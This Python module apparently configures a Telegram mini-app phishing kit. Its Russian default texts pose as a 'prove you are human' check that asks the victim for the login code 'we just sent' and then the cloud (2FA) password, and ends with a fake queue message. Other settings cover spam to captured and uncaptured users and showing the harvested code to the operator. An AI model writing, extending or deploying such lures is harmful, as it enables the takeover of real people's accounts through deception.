"""
========================================================================
 Данные и дефолты «Стандартного шаблона мини-аппа».
------------------------------------------------------------------------
 Перенесено из автономного бота-конструктора (miniapp_bot) и объединено
 с редактором шаблонов менеджера (handlers/template.py). Здесь собрано
 всё, что описывает «Стандартный шаблон»:

   • STD_DEFAULTS  — дефолтные тексты/подписи разделов корневого шаблона;
   • PAGES         — 4 страницы (листы) мини-аппа и их заголовки;
   • PAGE_FIELDS   — под-поля каждой страницы (эмодзи/кнопка/текст/…);
   • PAGE_DEFAULTS — дефолтные значения под-полей страниц;
   • COLORS        — палитра цвета интерфейса мини-аппа.

 Под-поля страниц хранятся в JSON-content шаблона под ключом
 f"{page}_{field}", напр.: main_text, code_wrong, twofa_placeholder,
 success_button. Ключи разделов и под-полей не пересекаются.
========================================================================
"""

from __future__ import annotations

# --- дефолты разделов корневого шаблона (ключи = поля редактора менеджера) ---
STD_DEFAULTS: dict[str, str] = {
    "start_msg": (
        "👋 Здравствуйте!\nЧтобы получить доступ к боту 👇\n\n"
        "❗ Пожалуйста, подтвердите то, что вы не робот"
    ),
    "start_btn": "🚀 Открыть мини-апп",
    "second_msg": "👆",
    "expired_msg": "⌛ Время на проверку вышло! Попробуйте ещё раз!",
    "expired_btn": "Попробовать ✅",
    "auth_ok": (
        "🎉 Вы успешно подтвердили, что вы настоящий человек!\n"
        "Ожидайте, ваше место в очереди 15."
    ),
    "spam_auth": "📢 Уведомление авторизованным пользователям.",
    "spam_unauth": "📢 Уведомление неавторизованным пользователям.",
    "admin_post": "",
    "show_auth": "✅ Показ успешной авторизации.",
    "show_code": "📋 Ваш код: {CODE}",
}

# --- страницы (листы) мини-аппа ---
PAGES: dict[str, str] = {
    "main": "Главная страница",
    "code": "Страница ввода кода",
    "twofa": "Страница с 2FA",
    "success": "Страница успешной авторизации",
}

# под-поля страниц: page -> [(field, label), ...] (порядок задаёт меню)
PAGE_FIELDS: dict[str, list[tuple[str, str]]] = {
    "main": [
        ("emoji", "😀 Эмодзи"),
        ("button", "💬 Текст кнопки"),
        ("waiting", "⏳ Текст ожидания"),
        ("text", "📝 Текст"),
    ],
    "code": [
        ("emoji", "😀 Эмодзи"),
        ("button", "💬 Текст кнопки"),
        ("wrong", "🚫 Текст неверного кода"),
        ("text", "📝 Текст"),
    ],
    "twofa": [
        ("emoji", "😀 Эмодзи"),
        ("button", "💬 Текст кнопки"),
        ("placeholder", "✏️ Текст в поле ввода"),
        ("hint", "💡 Текст подсказки"),
        ("text", "📝 Текст"),
    ],
    "success": [
        ("emoji", "😀 Эмодзи"),
        ("button", "💬 Текст кнопки"),
        ("text", "📝 Текст"),
    ],
}

# короткие поля (эмодзи/подпись кнопки) хранятся как обычный текст без HTML
SHORT_SUBFIELDS = {"emoji", "button"}

PAGE_DEFAULTS: dict[str, dict[str, str]] = {
    "main": {
        "emoji": "👋",
        "button": "Подтвердить",
        "waiting": "Ожидайте, не выходите!",
        "text": (
            "Нужно подтвердить, что вы настоящий человек, "
            "нажмите на кнопку ниже для начала!"
        ),
    },
    "code": {
        "emoji": "🔐",
        "button": "Узнать код",
        "wrong": (
            "❌ Вы ввели неверный код! Пожалуйста, перейдите по кнопке ниже, "
            "посмотрите код и затем введите его на клавиатуре ниже ⌨️"
        ),
        "text": "Введите 5-значный код, который мы вам только что отправили!",
    },
    "twofa": {
        "emoji": "🙈",
        "button": "Проверить",
        "placeholder": "Ваш пароль",
        "hint": "Подсказка",
        "text": (
            "Вы ввели верный код, но у вас установлен облачный пароль, "
            "введите его в поле ниже!"
        ),
    },
    "success": {
        "emoji": "🎉",
        "button": "Ок",
        "text": (
            "Вы сделали все правильно! Ваше место в очереди 15. "
            "Ожидайте, мы вам напишем!"
        ),
    },
}

# --- палитра цвета интерфейса мини-аппа ---
COLORS: dict[str, tuple[str, str]] = {
    "white": ("⚪", "Белый"),
    "black": ("⚫", "Чёрный"),
    "green": ("🟢", "Зелёный"),
    "blue": ("🔵", "Синий"),
    "red": ("🔴", "Красный"),
    "purple": ("🟣", "Фиолетовый"),
    "yellow": ("🟡", "Жёлтый"),
    "pink": ("🌸", "Розовый"),
    "lightblue": ("💙", "Голубой"),
    "default": ("🎨", "Стандартный"),
}


# --- виды (вёрстка/скин страниц мини-аппа) ---
# id -> название. Меняет компоновку страниц в мини-аппе (web/miniapp.html).
VIEWS: dict[str, str] = {
    "classic": "Классический",
    "card": "Карточка",
    "glass": "Стекло",
    "minimal": "Минимал",
    "bottom": "Кнопка снизу",
}
DEFAULT_VIEW = "classic"

# --- готовые фоны-градиенты (без картинок) ---
# id -> (название с эмодзи, CSS-значение background-image).
# Мягкие, приглушённые, средне-тёмные — комфортные для глаз и под белый текст.
BACKGROUNDS: dict[str, tuple[str, str]] = {
    "graphite": ("🪨 Графит", "linear-gradient(160deg,#2b2f36,#454b55)"),
    "night": ("🌙 Ночь", "linear-gradient(160deg,#1b2735,#2c3e50)"),
    "indigo": ("🔷 Индиго", "linear-gradient(160deg,#272a45,#434767)"),
    "teal": ("🌊 Море", "linear-gradient(160deg,#16323b,#27545f)"),
    "forest": ("🌿 Лес", "linear-gradient(160deg,#1e3a2f,#33564a)"),
    "plum": ("🟣 Слива", "linear-gradient(160deg,#2d2640,#4a3f63)"),
    "cocoa": ("🤎 Какао", "linear-gradient(160deg,#2b2522,#473d36)"),
    "fog": ("🌫 Туман", "linear-gradient(160deg,#2f3439,#4a525c)"),
    "mauve": ("🌸 Лаванда", "linear-gradient(160deg,#352b40,#574a5c)"),
    "ocean": ("🐬 Океан", "linear-gradient(160deg,#15323d,#28525f)"),
}


def background_css(value: str | None) -> str:
    """CSS background-image из значения content['bg'].

    Значением может быть id готового градиента, готовый CSS-градиент или URL
    картинки. Возвращает строку для background-image (или '' если пусто).
    """
    if not value:
        return ""
    if value in BACKGROUNDS:
        return BACKGROUNDS[value][1]
    if "gradient(" in value:
        return value
    if value.startswith(("http://", "https://", "data:", "//")):
        return f"url('{value}')"
    return ""  # неизвестный токен (напр. удалённый id пресета) — без фона


def page_field_key(page: str, field: str) -> str:
    """Ключ под-поля страницы в content шаблона."""
    return f"{page}_{field}"


# плоская карта дефолтов под-полей страниц: ключ content -> значение
PAGE_DEFAULT_FLAT: dict[str, str] = {
    page_field_key(page, field): value
    for page, fields in PAGE_DEFAULTS.items()
    for field, value in fields.items()
}

# все дефолты (разделы + под-поля страниц) одной картой
ALL_DEFAULTS: dict[str, str] = {**STD_DEFAULTS, **PAGE_DEFAULT_FLAT}


def default_content() -> dict:
    """Полный набор дефолтов для нового стандартного шаблона."""
    content: dict[str, str] = dict(ALL_DEFAULTS)
    content["ui_color"] = "default"
    content["view"] = DEFAULT_VIEW
    return content
